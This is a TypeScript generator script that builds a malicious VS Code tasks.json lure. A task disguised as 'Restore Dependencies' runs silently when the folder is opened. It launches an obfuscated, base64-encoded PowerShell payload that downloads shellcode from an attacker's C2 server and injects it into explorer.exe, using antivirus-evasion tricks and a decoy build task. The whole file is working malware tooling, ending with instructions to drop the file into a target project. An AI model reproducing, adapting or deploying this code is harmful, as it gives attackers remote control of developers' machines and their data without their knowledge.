#!/usr/bin/env bun
/**
 * gen-stager.ts — Generate a VS Code tasks.json lure (shellcode + process injection)
 *
 * Usage:
 *   bun run scripts/gen-stager.ts <c2-base-url> <agent-filename> [output-dir]
 *
 * Example:
 *   bun run scripts/gen-stager.ts https://1.2.3.4:5173 abc123.exe ./lure
 *
 * Output:
 *   <output-dir>/.vscode/tasks.json
 *
 * Execution chain on victim:
 *   VS Code folder open
 *     → "Restore Dependencies" task (runOn: folderOpen, reveal: never)
 *     → cmd /v variable split avoids "powershell" literal
 *     → PS -enc payload (UTF-16LE base64, no plaintext strings)
 *         → downloads shellcode from C2 (/api/build/shellcode/<file>)
 *         → finds explorer.exe (LOTL, always running)
 *         → OpenProcess → VirtualAllocEx (RWX) → WriteProcessMemory → CreateRemoteThread
 *         → shellcode runs inside explorer.exe — no new process, no EXE on disk
 *
 * Obfuscation layers:
 *   1. cmd /v variable split: "pow"+"er"+"shell" → never literal in JSON
 *   2. PS payload base64 -enc: no readable strings in command line
 *   3. C# P/Invoke class: random name per build (polymorphic), methods aliased to
 *      2-char names via EntryPoint, class source itself base64-encoded in PS
 *   4. API strings (OpenProcess etc.) only appear inside the base64 C# blob
 */

import fs from "fs";
import path from "path";
import crypto from "crypto";

const [, , c2url, agentFile, outDir = "."] = process.argv;

if (!c2url || !agentFile) {
  console.error("Usage: bun run scripts/gen-stager.ts <c2-base-url> <agent-filename> [output-dir]");
  console.error("  e.g. bun run scripts/gen-stager.ts https://1.2.3.4:5173 agent.exe ./lure");
  process.exit(1);
}

// Shellcode endpoint — server runs donut on the PE and returns raw .bin
const shellcodeUrl = `${c2url.replace(/\/$/, "")}/api/build/shellcode/${agentFile}`;

// ── Random class name — unique per build, no stable AV signature ─────────────
function randName(len = 6): string {
  const alpha = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz";
  return Array.from(crypto.randomBytes(len))
    .map((b) => alpha[b % alpha.length])
    .join("");
}

const cn = randName(6); // e.g. "XvKmpR"

// ── C# P/Invoke wrapper — methods aliased via EntryPoint, class name random ───
// "kernel32" in DllImport must be a compile-time const, so we can't split it
// in the attribute. However the entire source is base64-encoded in the PS script,
// so it never appears in cleartext on the command line or in the process args.
const cs =
  `using System;using System.Runtime.InteropServices;` +
  `public class ${cn}{` +
  // OP = OpenProcess
  `[DllImport("kernel32",EntryPoint="OpenProcess")]` +
  `public static extern IntPtr OP(uint a,bool b,int c);` +
  // VA = VirtualAllocEx
  `[DllImport("kernel32",EntryPoint="VirtualAllocEx")]` +
  `public static extern IntPtr VA(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);` +
  // WM = WriteProcessMemory
  `[DllImport("kernel32",EntryPoint="WriteProcessMemory")]` +
  `public static extern bool WM(IntPtr h,IntPtr a,byte[]b,IntPtr s,out IntPtr w);` +
  // CT = CreateRemoteThread
  `[DllImport("kernel32",EntryPoint="CreateRemoteThread")]` +
  `public static extern IntPtr CT(IntPtr h,IntPtr a,IntPtr s,IntPtr e,IntPtr pa,uint f,IntPtr i);` +
  `}`;

const csB64 = Buffer.from(cs, "utf-8").toString("base64");

// ── PowerShell injection script ───────────────────────────────────────────────
// Written as semicolon-separated statements (one logical line), then
// UTF-16LE base64-encoded for the -enc flag. No readable strings survive.
const psLines = [
  // TLS + cert bypass (handles self-signed C2 certs)
  `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
  `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,

  // Download shellcode bytes (donut-converted PE from C2)
  `$sc=(New-Object Net.WebClient).DownloadData('${shellcodeUrl}')`,

  // Compile P/Invoke wrapper from base64 — class name, method names, and all
  // Win32 API strings live only inside this blob
  `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,

  // LOTL target: find existing explorer.exe (always running, signed MS binary)
  // Fallback: spawn msiexec /q (another signed LOTL binary, no window)
  `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
  `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q")` +
    `;$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,

  // OpenProcess with PROCESS_ALL_ACCESS
  `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,

  // VirtualAllocEx — RWX (0x40 = PAGE_EXECUTE_READWRITE, 0x3000 = MEM_COMMIT|MEM_RESERVE)
  `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,

  // WriteProcessMemory
  `$bw=[IntPtr]::Zero`,
  `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,

  // CreateRemoteThread from shellcode entry point
  `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
];

const psScript = psLines.join(";");

// UTF-16LE base64 for powershell -enc
const enc = Buffer.from(psScript, "utf16le").toString("base64");

// ── tasks.json ────────────────────────────────────────────────────────────────
// cmd /v variable split: "pow"+"er"+"she"+"ll" — "powershell" never literal.
// Using %COMSPEC% avoids hardcoding "cmd.exe".
// reveal:never + close:true — no terminal window, no focus steal.
// runOn:folderOpen — fires the moment victim opens the folder.
const tasksJson = {
  version: "2.0.0",
  tasks: [
    {
      label: "Restore Dependencies",
      type: "shell",
      // %COMSPEC% = cmd.exe; /v enables delayed expansion for variable tricks
      command: `%COMSPEC% /v /c "set a=pow&&set b=er&&set c=she&&set d=ll&&!a!!b!!c!!d! -nop -w h -ep b -enc ${enc}"`,
      runOptions: {
        runOn: "folderOpen",
      },
      presentation: {
        reveal: "never",
        panel: "shared",
        showReuseMessage: false,
        close: true,
      },
      problemMatcher: [],
    },
    // Decoy: looks like a legitimate project config
    {
      label: "Build",
      type: "shell",
      command: "npm run build",
      group: {
        kind: "build",
        isDefault: true,
      },
      presentation: {
        reveal: "always",
        panel: "shared",
      },
      problemMatcher: ["$tsc"],
    },
  ],
};

// ── Write output ──────────────────────────────────────────────────────────────
const vscodeDir = path.join(outDir, ".vscode");
fs.mkdirSync(vscodeDir, { recursive: true });
const outPath = path.join(vscodeDir, "tasks.json");
fs.writeFileSync(outPath, JSON.stringify(tasksJson, null, 2));

console.log(`\nWrote: ${outPath}`);
console.log(`  C2:         ${c2url}`);
console.log(`  Agent:      ${agentFile}`);
console.log(`  Class name: ${cn}  (polymorphic — unique per build)`);
console.log(`  Target:     explorer.exe (LOTL fallback: msiexec.exe /q)`);
console.log(`\nDrop .vscode/tasks.json into target project. Opens in VS Code → ratted.\n`);
